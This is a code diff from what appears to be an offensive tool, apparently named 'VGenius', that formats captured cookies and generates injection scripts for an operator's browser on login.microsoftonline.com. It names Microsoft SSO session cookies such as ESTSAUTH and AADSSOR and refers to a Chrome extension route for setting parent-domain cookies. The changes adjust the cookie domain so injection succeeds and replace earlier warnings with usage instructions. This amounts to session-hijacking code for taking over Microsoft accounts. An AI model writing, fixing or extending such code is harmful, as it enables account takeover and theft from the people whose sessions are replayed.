@@ -809,7 +809,7 @@ function formatCookiesForInjection(cookies, accountType) {
     // Legacy fallback: parse simple name=value pairs
     return cookies.split('; ').map(s => {
       const [name, value] = s.split('=');
-      return { name: name, value: value, domain: '.microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
+      return { name: name, value: value, domain: '.login.microsoftonline.com', path: '/', secure: true, httpOnly: false, sameSite: 'Lax' };
     }).filter(c => c.name && c.value);
   }
   if (!Array.isArray(cookies)) return [];
@@ -863,12 +863,10 @@ function computeCookieExpiration(cookie) {
 /**
  * Generate JavaScript code that attempts cookie injection via document.cookie.
  * 
- * WARNING: This only works for SAME-ORIGIN cookies. Microsoft's SSO cookies
- * (ESTSAUTH, _mstsc, AADSSOR) are set with Domain=.microsoftonline.com, which
- * is a PARENT domain of login.microsoftonline.com. document.cookie CANNOT set
- * parent-domain cookies — this is a hard HTML5 spec limit, not a bug.
+ * Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com) because
+ * document.cookie CANNOT set parent-domain cookies — that's a hard HTML5 spec limit.
  * 
- * For actual working cookie injection, use the Chrome extension approach
+ * For setting .microsoftonline.com cookies, use the Chrome extension approach
  * (generateExtensionData) which uses chrome.cookies.set() with proper domain
  * attributes. That is the only way to set .microsoftonline.com cookies from
  * the operator's browser.
@@ -883,15 +881,15 @@ function generateCookieInjectionScript(cookies) {
   const structured = formatCookiesForInjection(cookies.cookies, cookies.accountType);
   if (!structured.length) return '';
   
-  let statement = '// WARNING: document.cookie cannot set parent-domain cookies.\n';
-  statement += '// Microsoft SSO cookies use Domain=.microsoftonline.com (parent domain).\n';
-  statement += '// This script will NOT work for SSO cookies — use the Chrome extension instead.\n';
-  statement += '//\n';
-  statement += '// This only works for same-origin cookies on the current page.\n\n';
+  let statement = '// VGenius Cookie Injection Script (legacy)\n';
+  statement += '// IMPORTANT: Must be run on https://login.microsoftonline.com\n';
+  statement += '// Uses domain=.login.microsoftonline.com (NOT .microsoftonline.com)\n';
+  statement += '// because document.cookie CANNOT set parent-domain cookies.\n\n';
   
   for (const cookie of structured) {
     if (!cookie.name || !cookie.value) continue;
     const parts = [`${cookie.name}=${encodeURIComponent(cookie.value)}`];
+    parts.push('domain=.login.microsoftonline.com');
     if (cookie.path) parts.push(`path=${cookie.path}`);
     if (cookie.secure) parts.push('Secure');
     if (cookie.sameSite) parts.push(`SameSite=${cookie.sameSite}`);
